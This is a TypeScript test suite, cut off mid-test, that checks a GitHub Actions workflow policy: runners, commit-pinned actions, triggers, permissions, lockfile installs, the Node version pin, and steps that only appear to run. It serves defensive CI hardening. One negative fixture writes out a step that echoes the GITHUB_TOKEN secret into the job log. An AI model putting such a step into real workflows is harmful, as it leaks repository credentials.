/**
 * TASK-017: the clean-room workflow is asserted by PARSING THE FILE IT SHIPS.
 *
 * Every case here reads `.github/workflows/verify.yml` from disk. That is the
 * point: a test against a string literal in this file would prove that the
 * literal satisfies the criteria, which is a fact about the test. AC-12 also
 * forbids depending on a real Actions run, so the file is the only evidence
 * available before integration — and it is genuine evidence, because it is the
 * same bytes GitHub will read.
 *
 * Each policy gets a POSITIVE case against the shipped file and a NEGATIVE case
 * against a synthetic workflow that violates it. Without the negative half, a
 * check that always returned `ok` would pass every positive case.
 *
 * Offline: reads two files, spawns nothing, touches no network.
 */

import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";

import { GUARDED_MODULES } from "../src/verification/guardedModules.js";
import {
  FREE_RUNNER_LABELS,
  checkActionPins,
  checkCheckout,
  checkInstall,
  checkRunAllowlist,
  checkStepExecution,
  checkWorkflowShape,
  ALLOWED_ACTIONS,
  ALLOWED_WITH_KEYS,
  checkCheckoutCredentials,
  INSTALL_ALIASES,
  checkNoExpressions,
  checkNodePin,
  checkPermissions,
  checkRunners,
  checkTriggers,
  checkVerificationCommand,
  get,
  parseWorkflow,
  runCommands,
  steps,
  type YamlMap,
} from "../src/verification/workflowPolicy.js";

/**
 * `process.cwd()`, matching what every other test here does — the compiled test
 * lives in `dist/tests/`, so resolving relative to the module would climb to
 * `dist/` and look for a workflow directory that does not exist there. The
 * suite runs from the repository root, which is the thing being described.
 */
const REPO_ROOT = process.cwd();
const WORKFLOW_PATH = join(REPO_ROOT, ".github/workflows/verify.yml");

const SOURCE = readFileSync(WORKFLOW_PATH, "utf8");
const PACKAGE = JSON.parse(readFileSync(join(REPO_ROOT, "package.json"), "utf8")) as {
  readonly engines?: { readonly node?: string };
};

function shipped(): YamlMap {
  const parsed = parseWorkflow(SOURCE);
  assert.equal(parsed.ok, true, `the shipped workflow does not parse: ${parsed.ok ? "" : parsed.reason}`);
  if (!parsed.ok) throw new Error("unreachable");
  return parsed.root;
}

/** A synthetic workflow, so a negative case can violate exactly one rule. */
function workflow(overrides: {
  readonly runsOn?: string;
  readonly uses?: readonly string[];
  readonly on?: readonly string[];
  readonly permissions?: string | undefined;
  readonly runs?: readonly string[];
  readonly nodeVersion?: string | undefined;
  /** Applied to every `run` step, so a case can make them not execute. */
  readonly stepIf?: string;
  readonly continueOnError?: boolean;
  /** Raw lines appended under `on:`, for trigger-filter cases. */
  readonly onFilters?: Readonly<Record<string, readonly string[]>>;
  /** Which action carries the node-version, so the pin can be misplaced. */
  readonly nodeVersionOn?: string;
} = {}): YamlMap {
  const on = overrides.on ?? ["pull_request", "push"];
  const uses = overrides.uses ?? ["actions/checkout@" + "a".repeat(40)];
  const runs = overrides.runs ?? ["npm ci", "npm test"];
  const lines: string[] = ["name: synthetic", "on:"];
  for (const event of on) {
    lines.push(`  ${event}:`);
    const filters = overrides.onFilters?.[event];
    if (filters === undefined) {
      lines.push("    branches:", '      - "**"');
    } else {
      lines.push(...filters);
    }
  }
  if (overrides.permissions !== undefined) {
    lines.push("permissions:", `  ${overrides.permissions}`);
  }
  lines.push("jobs:", "  verify:", `    runs-on: ${overrides.runsOn ?? "ubuntu-latest"}`, "    steps:");
  const carrier = overrides.nodeVersionOn ?? "setup-node";
  for (const use of uses) {
    lines.push(`      - uses: ${use}`);
    if (use.includes(carrier) && overrides.nodeVersion !== undefined) {
      lines.push("        with:", `          node-version: "${overrides.nodeVersion}"`);
    }
  }
  for (const run of runs) {
    lines.push(`      - run: ${run}`);
    if (overrides.stepIf !== undefined) {
      lines.push(`        if: ${overrides.stepIf}`);
    }
    if (overrides.continueOnError === true) {
      lines.push('        continue-on-error: "true"');
    }
  }
  const parsed = parseWorkflow(lines.join("\n") + "\n");
  assert.equal(parsed.ok, true, `the synthetic workflow does not parse: ${parsed.ok ? "" : parsed.reason}`);
  if (!parsed.ok) throw new Error("unreachable");
  return parsed.root;
}

describe("TASK-017: YAML is interpreted by a standards parser, and what cannot be represented is refused", () => {
  /**
   * THE READER'S HONESTY IS THE FOUNDATION. Every policy below is a claim about
   * structure, so a reader that guessed at a construct would make every one of
   * those claims a guess too.
   *
   * THESE CASES CHANGED MEANING AFTER ROUND 8, and the change is the point.
   * They used to assert that a hand-written parser REFUSED constructs it had not
   * implemented. Eight rounds showed that list could not be completed — roughly
   * half the CRITICALs were misreads, structure confidently reported that the
   * file does not have. So syntax moved to a standards-compliant parser, and
   * these cases now assert the two halves of the new boundary:
   *
   *   1. what the parser READS, it reads CORRECTLY, and the policy receives the
   *      real structure — the half that used to be a refusal and is now a fact;
   *   2. what the normalisation CANNOT REPRESENT is refused rather than coerced.
   *
   * The attacks those refusals used to stop are not lost. Each is now stopped by
   * the semantic policy, in the round-labelled block where it was found.
   */

  /** 1. Constructs that used to be refused, now read correctly. */
  for (const [label, source, read] of [
    [
      "a flow sequence",
      'branches: ["**", "!**"]\n',
      (root: YamlMap) => assert.deepEqual(get(root, "branches"), { kind: "seq", items: ["**", "!**"] }),
    ],
    [
      "a flow mapping",
      "with: { node-version: '22.5.0' }\n",
      (root: YamlMap) => assert.equal(get(get(root, "with"), "node-version"), "22.5.0"),
    ],
    [
      "a nested flow sequence, the round-6 misread",
      'branches:\n  - "**"\n  - ["!**"]\n',
      (root: YamlMap) =>
        assert.deepEqual(get(root, "branches"), { kind: "seq", items: ["**", { kind: "seq", items: ["!**"] }] }),
    ],
    [
      "a block scalar",
      "script: |\n  first\n  second\n",
      (root: YamlMap) => assert.equal(get(root, "script"), "first\nsecond\n"),
    ],
    [
      "a single document marker",
      "---\nname: verify\n",
      (root: YamlMap) => assert.equal(get(root, "name"), "verify"),
    ],
    [
      "indentation that is not a multiple of two",
      "jobs:\n   verify: yes-please\n",
      (root: YamlMap) => assert.equal(get(get(root, "jobs"), "verify"), "yes-please"),
    ],
    [
      "a hex escape, the round-3 misread",
      'value: "\\x21**"\n',
      (root: YamlMap) => assert.equal(get(root, "value"), "!**"),
    ],
    [
      "a unicode escape",
      'value: "\\u0021**"\n',
      (root: YamlMap) => assert.equal(get(root, "value"), "!**"),
    ],
    [
      "a doubled quote, which YAML reads as one",
      "name: 'a''b'\n",
      (root: YamlMap) => assert.equal(get(root, "name"), "a'b"),
    ],
    [
      "a comment after a quote inside a plain scalar, the round-8 misread",
      'name: foo "bar # baz\n',
      (root: YamlMap) => assert.equal(get(root, "name"), 'foo "bar'),
    ],
    [
      "a hash inside a quoted scalar, which is not a comment",
      'name: "a # b"\n',
      (root: YamlMap) => assert.equal(get(root, "name"), "a # b"),
    ],
    [
      "a hash with no space before it, which is not a comment either",
      "name: a#b\n",
      (root: YamlMap) => assert.equal(get(root, "name"), "a#b"),
    ],
  ] as const) {
    it(`reads ${label} correctly instead of guessing`, () => {
      const parsed = parseWorkflow(source);

      assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
      if (!parsed.ok) return;
      read(parsed.root);
    });
  }

  /**
   * 2. What the normalisation refuses.
   *
   * A parser hands back a richer world than the policy reasons about, and every
   * coercion is a chance to report something the file does not say. `1.0` and
   * `1` are different strings and the same number; a null is not an empty
   * mapping. These are refused rather than approximated.
   */
  for (const [label, source, reason] of [
    ["an anchor", "base: &anchor value\n", /anchor/],
    ["an alias", "base: &a value\nother: *a\n", /alias|anchor/],
    ["an explicit tag", "value: !!str 5\n", /tag/],
    ["a bare tag", "value: ! something\n", /tag/],
    ["a null value, the round-8 CRITICAL", "permissions:\njobs:\n  v: x\n", /null/],
    ["a number, which is not its own spelling", "node-version: 22.5\n", /number/],
    ["a boolean", "continue-on-error: true\n", /boolean/],
    ["MORE THAN ONE DOCUMENT", "name: x\n---\nname: y\n", /2 YAML documents/],
    ["a tab, which YAML forbids as indentation", "name: x\n\tfoo: 1\n", /tab/i],
    ["an unterminated quote", 'name: "verify\n', /quote/i],
    ["an invalid escape", 'name: "\\q"\n', /escape/i],
    ["a duplicate key", "permissions:\n  contents: read\nother: x\npermissions:\n  contents: write\n", /unique/i],
    ["a duplicate key inside a sequence item", "steps:\n  - run: npm ci\n    run: npm install\n", /unique/i],
    ["a duplicate key nested in a job", "jobs:\n  v:\n    runs-on: a\n    runs-on: b\n", /unique/i],
    ["non-breaking spaces used as indentation", "jobs:\n\u00a0\u00a0verify: x\n", /null|not valid YAML/],
    ["a top level that is not a mapping", "- a\n- b\n", /not a mapping/],
    ["an empty file", "", /empty/],
  ] as const) {
    it(`refuses ${label}`, () => {
      const parsed = parseWorkflow(source);

      assert.equal(parsed.ok, false, `${label} was represented instead of refused`);
      assert.match(
        parsed.ok === false ? parsed.reason : "",
        reason,
        `${label} was refused, but not for the reason that names it`,
      );
    });
  }

  /**
   * PARSE FAILURE MEANS REFUSE, NEVER "ABSENT, THEREFORE ALLOWED".
   *
   * The direction matters more than the refusal. A reader that turns "I could
   * not tell" into "there is nothing wrong" is the failure this whole area kept
   * producing, and it cannot be observed by testing well-formed inputs — so it
   * is asserted directly: a refused parse yields no document at all, and there
   * is therefore nothing a policy could be handed and pass.
   */
  it("never reports a malformed document as a passing workflow", () => {
    for (const malformed of ['name: "verify\n', "name: x\n\tfoo: 1\n", "a: 1\na: 2\n", "name: x\n---\nname: y\n"]) {
      const parsed = parseWorkflow(malformed);

      assert.equal(parsed.ok, false, `${JSON.stringify(malformed)} parsed`);
      assert.equal("root" in parsed, false, "a refused parse still produced a document");
    }
  });

  it("parses the shipped workflow, so the refusals above are not refusing everything", () => {
    const parsed = parseWorkflow(SOURCE);

    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
  });

  /**
   * THE SEAM IS A RE-EXPORT, NOT A SECOND IMPLEMENTATION.
   *
   * `workflowPolicy` re-exports the reader so callers have one import for "read
   * this workflow and judge it". That is a convenience, and the risk in it is
   * that someone later satisfies a failing case by wrapping or reimplementing
   * the reader on the policy side, leaving two readers that disagree. Asserting
   * identity costs one line and makes that divergence impossible to introduce
   * quietly.
   */
  it("re-exports the reader from workflowDocument rather than reimplementing it", async () => {
    const document = await import("../src/verification/workflowDocument.js");

    assert.equal(parseWorkflow, document.parseWorkflow);
    assert.equal(get, document.get);
  });

  /** Structure, not text: the shipped file really does yield jobs and steps. */
  it("reads the shipped workflow's structure", () => {
    const root = shipped();

    assert.equal(get(root, "name"), "verify");
    assert.ok(steps(root).length >= 4, `expected the shipped steps, got ${steps(root).length}`);
    assert.deepEqual(runCommands(root), ["npm ci", "npm test"]);
  });

  /**
   * `on` IS A STRING KEY IN YAML 1.2 AND A BOOLEAN IN YAML 1.1, which is why
   * the parser is pinned to 1.2. Under 1.1 this key would normalise to `true`
   * and every trigger check would find no `on` at all — the sort of silent
   * version-dependent misread the new boundary is supposed to remove, so it is
   * asserted rather than assumed.
   */
  it("reads `on` as a key rather than the boolean YAML 1.1 would make it", () => {
    const on = get(shipped(), "on");

    assert.notEqual(on, undefined, "the `on` key was lost to a YAML 1.1 boolean reading");
    assert.deepEqual(
      on === undefined || typeof on === "string" || on.kind !== "map" ? [] : on.entries.map(([key]) => key),
      ["pull_request", "push"],
    );
  });
});

describe("TASK-017 AC-1: only runners this repository knows to be unmetered", () => {
  it("accepts the shipped workflow's runner", () => {
    assert.equal(checkRunners(shipped()).ok, true);
  });

  /**
   * Larger runners are metered even on public repositories, which is what would
   * take this out of the included allowance.
   */
  for (const label of ["ubuntu-latest-8-cores", "ubuntu-latest-64-core", "macos-14", "windows-latest"]) {
    it(`refuses ${label}`, () => {
      const verdict = checkRunners(workflow({ runsOn: label }));

      assert.equal(verdict.ok, false, `${label} was accepted as unmetered`);
      assert.match(verdict.ok === false ? verdict.reason : "", /unmetered/);
    });
  }

  /** An allowlist, so a label nobody anticipated is refused rather than assumed. */
  it("refuses a runner label nobody has heard of", () => {
    assert.equal(checkRunners(workflow({ runsOn: "some-future-runner" })).ok, false);
  });

  it("keeps the allowlist to labels that are actually free", () => {
    for (const label of FREE_RUNNER_LABELS) {
      assert.match(label, /^ubuntu-/, `${label} is on the free allowlist but is not a standard Linux runner`);
    }
  });
});

describe("TASK-017 AC-6: every action is pinned to an immutable commit", () => {
  it("accepts the shipped workflow's pins", () => {
    assert.equal(checkActionPins(shipped()).ok, true);
  });

  /** And the shipped file really does use actions, so the check has work to do. */
  it("has actions to check in the shipped workflow", () => {
    const uses = steps(shipped())
      .map((step) => get(step, "uses"))
      .filter((value): value is string => typeof value === "string");

    assert.ok(uses.length >= 2, `expected pinned actions, found ${uses.length}`);
    for (const value of uses) {
      assert.match(value, /@[0-9a-f]{40}$/, `${value} is not commit-pinned`);
    }
  });

  for (const [label, pin] of [
    ["a major tag", "actions/checkout@v4"],
    ["a branch", "actions/checkout@main"],
    ["an abbreviated sha", "actions/checkout@3d3c42e"],
    ["an uppercase sha", `actions/checkout@${"A".repeat(40)}`],
    ["no ref at all", "actions/checkout"],
  ] as const) {
    it(`refuses ${label}`, () => {
      const verdict = checkActionPins(workflow({ uses: [pin] }));

      assert.equal(verdict.ok, false, `${pin} was accepted as commit-pinned`);
    });
  }
});

describe("TASK-017 AC-5: the workflow fires on the events a human's pull request raises", () => {
  it("accepts the shipped workflow's triggers", () => {
    assert.equal(checkTriggers(shipped()).ok, true);
  });

  it("refuses a workflow that never sees a pull request", () => {
    const verdict = checkTriggers(workflow({ on: ["push"] }));

    assert.equal(verdict.ok, false, "a workflow blind to pull requests was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /pull_request/);
  });

  it("refuses a workflow that never sees a push", () => {
    assert.equal(checkTriggers(workflow({ on: ["pull_request"] })).ok, false);
  });
});

describe("TASK-017 AC-7: no secret, and no permission beyond reading contents", () => {
  it("accepts the shipped workflow's permissions", () => {
    assert.equal(checkPermissions(shipped(), SOURCE).ok, true);
  });

  it("refuses a workflow that references a secret", () => {
    const verdict = checkPermissions(workflow(), "run: echo ${{ secrets.GITHUB_TOKEN }}");

    assert.equal(verdict.ok, false, "a secret reference was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /secret/);
  });

  it("refuses a workflow with no permissions block at all", () => {
    const verdict = checkPermissions(workflow({ permissions: undefined }), "clean");

    assert.equal(verdict.ok, false, "an inherited-permissions workflow was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /no permissions block/);
  });

  it("refuses write access to contents", () => {
    assert.equal(checkPermissions(workflow({ permissions: "contents: write" }), "clean").ok, false);
  });

  it("refuses a scope beyond contents", () => {
    assert.equal(checkPermissions(workflow({ permissions: "packages: read" }), "clean").ok, false);
  });

  /** The shipped file must genuinely contain the block, not merely parse. */
  it("declares the permissions block in the shipped file", () => {
    assert.match(SOURCE, /^permissions:\n {2}contents: read$/m);
  });
});

describe("TASK-017 AC-3: dependencies come from the lockfile", () => {
  it("accepts the shipped workflow's install", () => {
    assert.equal(checkInstall(shipped()).ok, true);
  });

  /**
   * `npm ci` IS PRESENT, so only the `npm install` refusal can decide this.
   *
   * The first version omitted `npm ci`, which let the "never installs" guard
   * refuse instead — and the case then passed with the `npm install` guard
   * deleted. My own mutation harness caught that; a negative case must leave
   * exactly one guard able to fire.
   */
  it("refuses npm install even alongside npm ci, because it may resolve differently", () => {
    const verdict = checkInstall(workflow({ runs: ["npm ci", "npm install", "npm test"] }));

    assert.equal(verdict.ok, false, "npm install was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /lockfile/);
  });

  it("refuses a workflow that installs nothing", () => {
    assert.equal(checkInstall(workflow({ runs: ["npm test"] })).ok, false);
  });
});

describe("TASK-017 AC-4: CI runs this repository's own verification", () => {
  it("accepts the shipped workflow's verification command", () => {
    assert.equal(checkVerificationCommand(shipped()).ok, true);
  });

  /**
   * A second definition of "verified" is the defect this prevents, so invoking
   * the underlying tools directly is refused even though it would run — because
   * it would run while meaning something else.
   */
  for (const command of ["node --test dist/tests/*.js", "tsc -p tsconfig.json", "node scripts/verify.mjs"]) {
    /**
     * `npm test` IS PRESENT, so only the direct-invocation refusal can decide.
     * Omitting it let the "never runs npm test" guard refuse instead, and the
     * case survived deleting the guard it was named for.
     */
    it(`refuses ${JSON.stringify(command)} as a second definition of verified`, () => {
      const verdict = checkVerificationCommand(workflow({ runs: ["npm ci", "npm test", command] }));

      assert.equal(verdict.ok, false, `${command} was accepted as verification`);
      assert.match(verdict.ok === false ? verdict.reason : "", /second definition/);
    });
  }

  it("refuses a workflow that never runs npm test", () => {
    assert.equal(checkVerificationCommand(workflow({ runs: ["npm ci"] })).ok, false);
  });
});

describe("TASK-017 AC-2: the Node version is a decision bound to engines", () => {
  it("accepts the shipped pin against the real engines range", () => {
    const verdict = checkNodePin(shipped(), PACKAGE.engines?.node);

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });

  /** The premise: package.json really does declare a range to check against. */
  it("finds an engines.node range in package.json", () => {
    assert.match(PACKAGE.engines?.node ?? "", /^>=\s*\d+\.\d+\.\d+$/);
  });

  it("refuses a pin below the engines floor", () => {
    const pinned = workflow({
      uses: [`actions/setup-node@${"b".repeat(40)}`],
      nodeVersion: "20.0.0",
    });

    const verdict = checkNodePin(pinned, ">=22.5.0");

    assert.equal(verdict.ok, false, "a Node version below the engines floor was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /22\.5\.0/);
  });

  it("accepts a pin above the engines floor", () => {
    const pinned = workflow({
      uses: [`actions/setup-node@${"b".repeat(40)}`],
      nodeVersion: "24.1.0",
    });

    assert.equal(checkNodePin(pinned, ">=22.5.0").ok, true);
  });

  /**
   * A `setup-node` THAT DOES NOT RUN PINS NOTHING.
   *
   * The shape allowlist refuses a step-level `if` before this is reached, so
   * this check is defence in depth — and it survived mutation until this case
   * existed, because nothing could tell it from its absence. Asserted directly
   * against `checkNodePin` so only that filter can decide it.
   */
  it("refuses a node-version on a setup-node a condition would skip", () => {
    const parsed = parseWorkflow(
      [
        "name: x",
        "on:",
        "  push:",
        "    branches:",
        '      - "**"',
        "jobs:",
        "  verify:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        `      - uses: actions/setup-node@${"b".repeat(40)}`,
        "        if: success()",
        "        with:",
        '          node-version: "22.5.0"',
        "",
      ].join("\n"),
    );
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    const verdict = checkNodePin(parsed.root, ">=22.5.0");

    assert.equal(verdict.ok, false, "a skipped setup-node counted as a pin");
    assert.match(verdict.ok === false ? verdict.reason : "", /setup-node step pins a node-version/);
  });

  it("refuses a workflow that pins no Node version at all", () => {
    const verdict = checkNodePin(workflow(), ">=22.5.0");

    assert.equal(verdict.ok, false, "an unpinned Node version was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /setup-node step pins a node-version/);
  });

  it("refuses an inexact pin, which is a range rather than a decision", () => {
    const pinned = workflow({
      uses: [`actions/setup-node@${"b".repeat(40)}`],
      nodeVersion: "22",
    });

    assert.equal(checkNodePin(pinned, ">=22.5.0").ok, false);
  });

  /** An engines form this check does not implement refuses rather than guesses. */
  it("refuses an engines range it does not implement", () => {
    const pinned = workflow({
      uses: [`actions/setup-node@${"b".repeat(40)}`],
      nodeVersion: "22.5.0",
    });

    assert.equal(checkNodePin(pinned, "^22.5.0").ok, false);
  });
});

/**
 * TASK-017 round-1 review: a command that APPEARS is not a command that RUNS.
 *
 * The reviewer's CRITICAL, and it was exact. `run: npm test` under
 * `if: ${{ false }}` never executes; under `continue-on-error: true` it
 * executes, fails, and the job passes anyway; `echo npm test` merely contains
 * the words. All three satisfied the substring searches these checks used to
 * do, so the workflow could verify nothing while every policy said ok.
 */
describe("TASK-017 round-1 CRITICAL: the policies read execution, not text", () => {
  it("refuses an install step that a condition prevents from running", () => {
    const verdict = checkInstall(workflow({ stepIf: "success()" }));

    assert.equal(verdict.ok, false, "a skipped npm ci counted as an install");
    assert.match(verdict.ok === false ? verdict.reason : "", /unconditionally/);
  });

  it("refuses a verification step that a condition prevents from running", () => {
    const verdict = checkVerificationCommand(workflow({ stepIf: "success()" }));

    assert.equal(verdict.ok, false, "a skipped npm test counted as verification");
    assert.match(verdict.ok === false ? verdict.reason : "", /unconditionally/);
  });

  /** ANY condition, not just a false one — evaluating them would be guessing. */
  it("refuses a verification step under a condition that might be true", () => {
    const verdict = checkVerificationCommand(workflow({ stepIf: "failure()" }));

    assert.equal(verdict.ok, false, "a conditional verification step was accepted");
  });

  it("refuses a verification step whose failure would not fail the job", () => {
    const verdict = checkVerificationCommand(workflow({ continueOnError: true }));

    assert.equal(verdict.ok, false, "continue-on-error verification was accepted");
  });

  it("refuses continue-on-error anywhere in the workflow", () => {
    const verdict = checkStepExecution(workflow({ continueOnError: true }));

    assert.equal(verdict.ok, false, "a step that cannot fail the job was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /continue-on-error/);
  });

  it("accepts the shipped workflow, whose steps are unconditional", () => {
    assert.equal(checkStepExecution(shipped()).ok, true);
  });

  /** `echo npm ci` contains the words and installs nothing. */
  for (const [label, command] of [
    ["echoed", "echo npm ci"],
    ["commented into a longer command", "true && echo 'npm ci'"],
  ] as const) {
    it(`refuses an install that is only ${label}`, () => {
      const verdict = checkInstall(workflow({ runs: [command, "npm test"] }));

      assert.equal(verdict.ok, false, `${command} counted as an install`);
    });
  }

  it("refuses a verification command that is only echoed", () => {
    const verdict = checkVerificationCommand(workflow({ runs: ["npm ci", "echo npm test"] }));

    assert.equal(verdict.ok, false, "echo npm test counted as verification");
  });
});

/**
 * TASK-017 round-1 HIGH 4: `npm i` is an official alias for `npm install`, and
 * npm accepts a family of abbreviations besides. A check written for the long
 * spelling caught one of them.
 */
describe("TASK-017 round-1 HIGH 4: every spelling of npm install is refused", () => {
  /**
   * NPM'S LIST, TRANSCRIBED INDEPENDENTLY OF THE ONE UNDER TEST (round-11
   * review, HIGH).
   *
   * `npm help install` reports: add, i, in, ins, inst, insta, instal, isnt,
   * isnta, isntal, isntall. The previous version of this block tested a
   * HAND-PICKED SEVEN of those, and `isnt` was in neither the policy's list nor
   * the seven — so the guard had a hole and its own tests were shaped around
   * the hole. `isnta`, `isntal` and `isntall` were all present, which is why
   * reading the list did not reveal the shortest of the four was missing.
   *
   * Transcribing npm's list here, separately from `INSTALL_ALIASES`, means the
   * two can be compared. A test that iterates the constant it is testing proves
   * only that the constant equals itself.
   */
  const NPM_DOCUMENTED_ALIASES: readonly string[] = [
    "add", "i", "in", "ins", "inst", "insta", "instal",
    "isnt", "isnta", "isntal", "isntall",
  ];

  it("covers every alias npm documents", () => {
    const missing = NPM_DOCUMENTED_ALIASES.filter((alias) => !INSTALL_ALIASES.includes(alias));

    assert.deepEqual(missing, [], `npm documents install aliases the policy does not refuse: ${missing.join(", ")}`);
  });

  /**
   * EVERY alias, and `checkInstall` DIRECTLY.
   *
   * `npm isnt` was refused by `checkRunAllowlist` and accepted by
   * `checkInstall`, so the aggregate looked correct while the guard named for
   * this job did nothing. Calling the guard on its own is what distinguishes
   * "the workflow is refused" from "this guard refuses it" — the sibling-guard
   * masking that has now been found eight times in this task.
   */
  for (const alias of [...NPM_DOCUMENTED_ALIASES, "install"]) {
    it(`refuses npm ${alias} at checkInstall itself`, () => {
      const verdict = checkInstall(workflow({ runs: ["npm ci", `npm ${alias}`, "npm test"] }));

      assert.equal(verdict.ok, false, `npm ${alias} was accepted alongside npm ci`);
      assert.match(verdict.ok === false ? verdict.reason : "", /lockfile/);
    });
  }

  /** The control: `npm ci` and `npm test` are not install aliases. */
  it("still accepts a workflow whose only npm commands are ci and test", () => {
    assert.equal(checkInstall(workflow()).ok, true);
  });

  /**
   * AND THE SIBLING IS NOT WHAT SAVES US. Stated as its own case so that a
   * future change to the command allowlist cannot quietly become the only
   * thing refusing an install alias.
   */
  it("refuses an install alias even where the command allowlist would too", () => {
    const root = workflow({ runs: ["npm ci", "npm isnt", "npm test"] });

    assert.equal(checkRunAllowlist(root).ok, false, "the sibling guard should also refuse this");
    assert.equal(checkInstall(root).ok, false, "but checkInstall must refuse it on its own");
  });
});

/**
 * TASK-017 round-1 HIGH 2: `with: node-version:` on some other action
 * configures that action. The runner's Node is pinned by `setup-node` or by
 * nothing.
 */
describe("TASK-017 round-1 HIGH 2: the Node pin must be on setup-node", () => {
  it("refuses a node-version carried by an unrelated action", () => {
    const misplaced = workflow({
      uses: [`actions/cache@${"c".repeat(40)}`],
      nodeVersion: "22.5.0",
      nodeVersionOn: "cache",
    });

    const verdict = checkNodePin(misplaced, ">=22.5.0");

    assert.equal(verdict.ok, false, "a node-version on another action counted as a pin");
    assert.match(verdict.ok === false ? verdict.reason : "", /setup-node/);
  });

  it("accepts a node-version carried by setup-node", () => {
    const pinned = workflow({
      uses: [`actions/setup-node@${"b".repeat(40)}`],
      nodeVersion: "22.5.0",
    });

    assert.equal(checkNodePin(pinned, ">=22.5.0").ok, true);
  });
});

/**
 * TASK-017 round-1 HIGH 3: naming an event is not triggering on it. `types`
 * narrows which activity fires the workflow, and `branches-ignore` can exclude
 * every branch — so a workflow can name both events and run for neither.
 */
describe("TASK-017 round-1 HIGH 3: trigger filters are read, not just event names", () => {
  it("refuses a pull_request narrowed to closed", () => {
    const narrowed = workflow({
      onFilters: { pull_request: ["    types:", "      - closed"] },
    });

    const verdict = checkTriggers(narrowed);

    assert.equal(verdict.ok, false, "a workflow that never sees a new pull request was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /opened/);
  });

  it("refuses a pull_request that misses synchronize, so updates produce nothing", () => {
    const narrowed = workflow({
      onFilters: { pull_request: ["    types:", "      - opened"] },
    });

    assert.equal(checkTriggers(narrowed).ok, false);
  });

  it("accepts a pull_request whose types include opened and synchronize", () => {
    const explicit = workflow({
      onFilters: { pull_request: ["    types:", "      - opened", "      - synchronize"] },
    });

    assert.equal(checkTriggers(explicit).ok, true);
  });

  it("refuses branches-ignore, which can exclude every branch", () => {
    const ignored = workflow({
      onFilters: { push: ["    branches-ignore:", '      - "**"'] },
    });

    const verdict = checkTriggers(ignored);

    assert.equal(verdict.ok, false, "a push excluded from every branch was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /branches-ignore/);
  });

  it("refuses a branch list that does not cover every branch", () => {
    const limited = workflow({
      onFilters: { push: ["    branches:", "      - main"] },
    });

    assert.equal(checkTriggers(limited).ok, false);
  });

  it("accepts the shipped workflow's filters", () => {
    assert.equal(checkTriggers(shipped()).ok, true);
  });
});

describe("TASK-017 round-1 note: permissions must be a mapping", () => {
  it("refuses a permissions sequence, which grants nothing legible", () => {
    const parsed = parseWorkflow(
      ["name: x", "on:", "  push:", "    branches:", '      - "**"', "permissions:", "  - contents", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:", "      - run: npm test", ""].join("\n"),
    );
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    const verdict = checkPermissions(parsed.root, "clean");

    assert.equal(verdict.ok, false, "a permissions sequence was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /sequence/);
  });
});

/**
 * TASK-017 round-2 review: the policies now refuse what they do not reason
 * about, the way the parser does.
 *
 * Six findings, one cause. The parser refuses YAML constructs it does not
 * implement; the policies accepted GitHub FEATURES they did not know about.
 * Job-level `if`, job-level `continue-on-error`, job-level `permissions`,
 * `paths-ignore`, a negative branch pattern, `with: repository:` on checkout —
 * all documented, all changing what runs, all previously green.
 *
 * These cases are written as raw YAML rather than through the synthetic
 * builder, because each is the reviewer's exact reproduction and should be
 * readable as such.
 */
describe("TASK-017 round-2: the workflow shape is an allowlist", () => {
  const BASE = [
    "name: x",
    "on:",
    "  pull_request:",
    "    branches:",
    '      - "**"',
    "  push:",
    "    branches:",
    '      - "**"',
    "permissions:",
    "  contents: read",
    "jobs:",
    "  verify:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    `      - uses: actions/checkout@${"a".repeat(40)}`,
    `      - uses: actions/setup-node@${"b".repeat(40)}`,
    "        with:",
    '          node-version: "22.5.0"',
    "      - run: npm ci",
    "      - run: npm test",
  ];

  function from(lines: readonly string[]): YamlMap {
    const parsed = parseWorkflow(lines.join("\n") + "\n");
    assert.equal(parsed.ok, true, `fixture does not parse: ${parsed.ok ? "" : parsed.reason}`);
    if (!parsed.ok) throw new Error("unreachable");
    return parsed.root;
  }

  /** Inserts lines after the first line matching `after`. */
  function withLines(after: string, added: readonly string[]): YamlMap {
    const index = BASE.findIndex((line) => line === after);
    assert.notEqual(index, -1, `the fixture has no line ${JSON.stringify(after)}`);
    return from([...BASE.slice(0, index + 1), ...added, ...BASE.slice(index + 1)]);
  }

  it("accepts the fixture it starts from, so the refusals below mean something", () => {
    assert.equal(checkWorkflowShape(from(BASE)).ok, true);
  });

  it("accepts the SHIPPED workflow", () => {
    const verdict = checkWorkflowShape(shipped());

    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
  });

  /** The reviewer's four job- and step-level execution controls. */
  for (const [label, after, added] of [
    ["a job-level condition", "  verify:", ["    if: success()"]],
    ["job-level continue-on-error", "  verify:", ['    continue-on-error: "true"']],
    ["job-level permissions", "  verify:", ["    permissions:", "      contents: write"]],
    ["a step-level condition", `      - uses: actions/setup-node@${"b".repeat(40)}`, ["        if: success()"]],
  ] as const) {
    it(`refuses ${label}`, () => {
      const verdict = checkWorkflowShape(withLines(after, added));

      assert.equal(verdict.ok, false, `${label} was accepted`);
    });
  }

  it("refuses paths-ignore, which can stop the workflow running entirely", () => {
    const verdict = checkWorkflowShape(withLines("  push:", ["    paths-ignore:", '      - "**"']));

    assert.equal(verdict.ok, false, "paths-ignore was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /paths-ignore/);
  });

  it("refuses branches-ignore at the shape level", () => {
